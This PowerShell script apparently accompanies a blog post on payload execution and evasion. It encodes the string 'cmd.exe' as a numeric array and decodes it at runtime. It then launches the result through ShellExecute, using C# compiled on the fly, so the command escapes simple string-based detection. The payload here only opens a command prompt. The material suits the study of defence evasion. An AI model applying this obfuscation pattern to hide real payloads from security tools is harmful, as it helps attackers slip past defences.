#Source licensed GPLv2 by Dennis Chow dchow[AT]xtecsystems.com 21-July-2020
#Visit my https://github.com/dc401 for complementing code
#https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051fd149b2

#create a encrypt function
function encryptArr {

                (3 * $args[0] + $args[1])

}

#create the decrypt function and signal dictionary

function decryptArr {
	$decrypt = ($args[0] - $args[1]) / 3
	switch ($decrypt)
	    {
		1 {"a"}
	        2 {"b"}
        	3 {"c"}
	        4 {"d"}
	        5 {"e"}
	        6 {"f"}
	        7 {"g"}
	        8 {"h"}
	        9 {"i"}
	        10 {"j"}
	        11 {"k"}
	        12 {"l"}
	        13 {"m"}
	        14 {"n"}
	        15 {"o"}
	        16 {"p"}
	        17 {"q"}
	        18 {"r"}
	        19 {"s"}
	        20 {"t"}
	        21 {"u"}
	        22 {"v"}
	        23 {"w"}
	        24 {"x"}
	        25 {"y"}
	        26 {"z"}
		99 {"."}
	        default {" "}
	    } 
}

#define variables and make them empty

$encrypted = @()
$signal = @( 3,13,4,99,5,24,5 )
$commandstring = ""

#start the encryption routine on the signal array

for ($i=0; $i -lt $signal.Count; $i++) { $result = (encryptArr $signal[$i] 2); $encrypted = $encrypted + $result }

#decrypt the ciphertext with the proper key (in our case 2)

$encrypted | ForEach-Object { $result = decryptArr $_ 2; $commandstring += $result }

#define the shellexec dll and method to call

$foo = @'

[DllImport("shell32.dll", EntryPoint = "ShellExecute")]

public static extern string Shell(IntPtr HWND, string operation, string file, string parameters, string directory, int showcmd);

'@

#Compile the C# code on the fly for when it needs to be called

$bar = Add-Type -MemberDefinition $foo -Name 'Shell32' -Namespace 'Win32' -PassThru

#call our shell command using the commandstring decrypted variable

$bar::Shell(0,'open',$commandstring,'','',5)